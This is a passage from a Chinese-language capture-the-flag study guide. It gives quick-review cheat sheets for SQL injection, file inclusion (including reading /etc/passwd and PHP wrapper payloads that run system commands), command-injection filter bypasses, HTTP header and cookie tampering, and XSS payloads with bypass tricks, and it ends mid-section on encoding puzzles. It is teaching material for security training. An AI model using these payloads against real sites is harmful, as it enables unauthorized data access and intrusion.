### 2.2 Payload速查卡片复习

```
【实战前快速复习Payload】

SQL注入复习（5分钟）：
  判断注入：
    ?id=1' → 报错
    ?id=1 and 1=1 → 正常
    ?id=1 and 1=2 → 异常
  
  判断列数：
    ?id=1 order by 1
    ?id=1 order by 2
    ...直到报错
  
  联合查询：
    ?id=-1 union select 1,2,3
  
  查数据：
    SELECT schema_name FROM information_schema.schemata
    SELECT table_name FROM information_schema.tables WHERE table_schema='库名'
    SELECT column_name FROM information_schema.columns WHERE table_name='表名'

文件包含复习（3分钟）：
  基础Payload：
    ?file=../../../etc/passwd
  
  伪协议：
    php://filter/convert.base64-encode/resource=index.php
    php://input + POST:<?php system('ls');?>
    data://text/plain,<?php system('cat /flag');?>
    file:///flag
  
  绕过技巧：
    ../过滤 → ....// 或 ..%2f

命令执行复习（3分钟）：
  连接符：
    ; → 顺序执行
    | → 管道传递
    || → 失败才执行
    && → 成功才执行
  
  空格绕过：
    $IFS、$IFS$9、${IFS}、%09
  
  关键字绕过：
    cat → ca''t、ca\t、head
    flag → fl*、fl?g

Misc复习（2分钟）：
  文件头：
    PNG: 89 50 4E 47
    JPG: FF D8 FF
    ZIP: 50 4B 03 04
  
  LSB提取：
    StegSolve → Data Extract → LSB
  
  流量分析：
    Wireshark → Follow TCP Stream
```

### 3.2 HTTP协议题目解题流程

```
【HTTP协议解题标准流程】

步骤1：观察题目要求（3分钟）
  动作：
    1. 访问题目URL
    2. 阅读题目描述
    3. 理解题目要求
    4. 确定需要修改的内容
  
  常见要求：
    - 修改请求方法（GET→POST）
    - 修改Cookie值
    - 修改User-Agent
    - 修改Referer
    - 修改X-Forwarded-For

步骤2：使用Burp抓包（5分钟）
  动作：
    1. 打开Burp Proxy
    2. 开启拦截
    3. 访问题目URL
    4. 查看抓到的请求
  
  观察：
    - 请求方法
    - 请求头
    - Cookie
    - 参数

步骤3：修改请求内容（5分钟）
  动作：
    1. 在Burp中修改请求
    2. 根据题目要求修改对应字段
    3. 发送修改后的请求
  
  修改示例：
    Cookie修改：
      Cookie: admin=0 → Cookie: admin=1
    
    User-Agent修改：
      User-Agent: Chrome → User-Agent: iPhone
    
    Referer修改：
      Referer: http://xxx → Referer: http://www.google.com
    
    X-Forwarded-For修改：
      添加：X-Forwarded-For: 127.0.0.1

步骤4：获取Flag（5分钟）
  动作：
    1. 发送修改后的请求
    2. 查看响应内容
    3. 寻找flag
  
  观察：
    flag可能在：
    - 响应内容中
    - 响应头中
    - 页面跳转后
```

### 3.3 HTTP协议常见考点

```
【HTTP协议常见考点汇总】

考点1：请求方法修改
  特点：题目要求使用特定请求方法
  解法：
    1. Burp抓包
    2. 修改请求方法（GET→POST）
    3. 添加请求体（POST需要）
    4. 发送请求

考点2：Cookie修改
  特点：题目要求修改Cookie值
  解法：
    1. Burp抓包
    2. 修改Cookie值
    3. 发送请求
  
  常见修改：
    admin=0 → admin=1
    role=user → role=admin
    login=false → login=true

考点3：User-Agent修改
  特点：题目要求特定UA
  解法：
    1. Burp抓包
    2. 修改User-Agent
    3. 发送请求
  
  常见UA：
    Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X)
    Mozilla/5.0 (Linux; Android 6.0)
    curl/7.64.1

考点4：Referer修改
  特点：题目要求特定来源
  解法：
    1. Burp抓包
    2. 添加或修改Referer
    3. 发送请求
  
  常见Referer：
    http://www.google.com
    http://admin.xxx.com
    http://localhost

考点5：X-Forwarded-For修改
  特点：题目要求特定IP
  解法：
    1. Burp抓包
    2. 添加X-Forwarded-For头
    3. 发送请求
  
  常见IP：
    127.0.0.1（本地）
    192.168.1.1（内网）
    10.0.0.1（内网）
```

## 四、Web简单题实战（第二道）

### 4.1 XSS题目解题流程

```
【XSS解题标准流程】

步骤1：识别XSS点（5分钟）
  动作：
    1. 访问题目URL
    2. 观察页面结构
    3. 找到输入点
    4. 测试输入
  
  测试：
    输入：<script>alert(1)</script>
    观察：是否有弹窗
  
  判断：
    如果弹窗 → 存在XSS
    如果不弹窗 → 可能被过滤

步骤2：测试过滤（5分钟）
  动作：
    1. 测试各种XSS Payload
    2. 观察哪些被过滤
    3. 尝试绕过方法
  
  测试Payload：
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    <body onload=alert(1)>
    "><script>alert(1)</script>

步骤3：构造Payload（5分钟）
  动作：
    1. 根据过滤情况构造Payload
    2. 尝试各种绕过方法
    3. 测试Payload有效性
  
  绕过方法：
    script被过滤：
      <img src=x onerror=alert(1)>
      <svg onload=alert(1)>
    
    onerror被过滤：
      <img src=x onload=alert(1)>
    
    alert被过滤：
      <img src=x onerror=confirm(1)>
      <img src=x onerror=prompt(1)>
    
    大小写绕过：
      <ScRiPt>alert(1)</ScRiPt>

步骤4：获取Flag（5分钟）
  动作：
    1. 成功执行XSS
    2. 查看页面内容
    3. 寻找flag
  
  注意：
    CTF中的XSS题目通常：
    - 不需要真正弹窗
    - 需要读取页面内容
    - 或需要发送数据到服务器
```

### 4.2 XSS常见考点

```
【XSS常见考点汇总】

考点1：反射型XSS
  特点：输入直接输出到页面
  解法：
    1. 找到输入点
    2. 输入XSS Payload
    3. 查看输出
  
  Payload：
    <script>alert(1)</script>
    "><script>alert(1)</script>

考点2：存储型XSS
  特点：输入被存储，后续访问触发
  解法：
    1. 找到存储点（如评论、留言）
    2. 输入XSS Payload
    3. 刷新页面触发
  
  Payload：
    同反射型XSS

考点3：DOM型XSS
  特点：JavaScript动态输出
  解法：
    1. 找到DOM操作点
    2. 输入XSS Payload
    3. 触发DOM操作
  
  Payload：
    #<script>alert(1)</script>
    ?param=<script>alert(1)</script>

考点4：过滤绕过
  特点：关键字被过滤
  解法：
    1. 测试哪些被过滤
    2. 使用替代标签
    3. 使用编码绕过
  
  绕过方法：
    大小写：<ScRiPt>
    编码：%3Cscript%3E
    双写：<scr<script>ipt>

考点5：特殊场景XSS
  特点：特殊输入场景
  解法：
    1. 分析输入场景
    2. 构造特定Payload
    3. 测试有效性
```

## 六、Misc简单题实战（第一道）

### 6.1 编码解码题目解题流程

```
【编码解码解题标准流程】

步骤1：下载并观察文件（2分钟）
  动作：
    1. 下载题目文件
    2. 打开文件查看内容
    3. 观察内容特征
  
  观察特征：
    - 是否有=结尾？（Base64）
    - 是否有%XX？（URL编码）
    - 是否全是0-9A-F？（Hex编码）
    - 是否全是.和-？（Morse编码）
    - 是否全是0和1？（Binary编码）

步骤2：识别编码类型（3分钟）
  动作：
    1. 根据特征判断编码类型
    2. 使用CyberChef解码
    3. 观察解码结果
  
  编码识别：
    Base64特征：
      - 结尾可能有=
      - 字符范围：A-Za-z0-9+/=
    
    URL编码特征：
      - 有%XX格式
      - XX是十六进制
    
    Hex编码特征：
      - 全是0-9A-F
      - 每两个字符代表一个字节
    
    Morse编码特征：
      - 全是.和-
      - 用空格分隔
    
    Binary编码特征：
      - 全是0和1
      - 每8位代表一个字符

步骤3：解码获取内容（5分钟）
  动作：
    1. 使用CyberChef解码
    2. 可能需要多次解码
    3. 获取最终内容
  
  CyberChef操作：
```
